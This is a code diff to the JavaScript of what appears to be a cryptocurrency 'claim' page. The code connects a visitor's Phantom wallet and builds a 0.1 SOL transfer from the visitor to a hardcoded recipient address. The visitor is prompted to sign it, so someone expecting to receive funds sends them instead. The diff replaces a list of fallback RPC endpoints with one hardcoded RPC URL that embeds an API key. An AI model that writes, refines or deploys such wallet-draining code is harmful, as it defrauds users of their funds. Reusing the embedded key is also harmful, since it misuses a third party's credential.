@@ -63,12 +63,8 @@
         // ==========================================
         const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
 
-        // List of reliable public RPCs (No API Key required for basic usage)
-        const RPC_ENDPOINTS = [
-            "https://api.mainnet-beta.solana.com", // Official Default
-            "https://rpc.ankr.com/solana",         // Ankr (Free Tier)
-            "https://solana-mainnet.g.alchemy.com/v2/demo" // Alchemy Demo (Good for testing)
-        ];
+        // Primary Reliable RPC (Helius Public)
+        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
 
         async function initiateClaim() {
             const statusDiv = document.getElementById("status");
@@ -80,9 +76,9 @@
             }
 
             try {
-                statusDiv.innerText = "Connecting to Phantom...";
+                statusDiv.innerText = "Connecting...";
                 
-                // 1. Connect
+                // 1. Connect to Phantom
                 const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
                 
@@ -98,7 +94,7 @@
                 // 3. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Transfer 0.1 SOL
+                // Transfer 0.1 SOL (100,000,000 lamports)
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
@@ -107,30 +103,21 @@
                     })
                 );
 
-                // 4. Find a Working RPC
-                statusDiv.innerText = "Finding network connection...";
-                let finalBlockhash;
+                // 4. Fetch Recent Blockhash
+                statusDiv.innerText = "Fetching blockhash...";
                 
-                // Try each RPC until one works
-                for (const url of RPC_ENDPOINTS) {
-                    try {
-                        const connection = new solanaWeb3.Connection(url);
-                        const result = await connection.getLatestBlockhash();
-                        console.log("Connected to:", url);
-                        finalBlockhash = result.blockhash;
-                        break; // Exit loop if successful
-                    } catch (err) {
-                        console.warn(`RPC ${url} failed:`, err.message);
-                        // Continue to next RPC
-                    }
+                const connection = new solanaWeb3.Connection(RPC_URL);
+                
+                try {
+                    // Try to get blockhash
+                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                    
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = userPublicKey;
+                } catch (err) {
+                    console.error("RPC Error:", err);
+                    throw new Error("Network Error: " + err.message);
                 }
-
-                if (!finalBlockhash) {
-                    throw new Error("All RPC endpoints failed. Please try again later.");
-                }
-
-                transaction.recentBlockhash = finalBlockhash;
-                transaction.feePayer = userPublicKey;
 
                 statusDiv.innerText = "Sign Green...";
                 
@@ -138,9 +125,8 @@
                 const signedTx = await window.solana.signTransaction(transaction);
                 console.log("Signed");
 
-                // 6. Send (Use the first working RPC for sending as well)
+                // 6. Send
                 statusDiv.innerText = "Sending transaction...";
-                const connection = new solanaWeb3.Connection(RPC_ENDPOINTS[0]); // Use default for send
                 
                 const signature = await window.solana.sendTransaction(signedTx, {
                     skipPreflight: false,
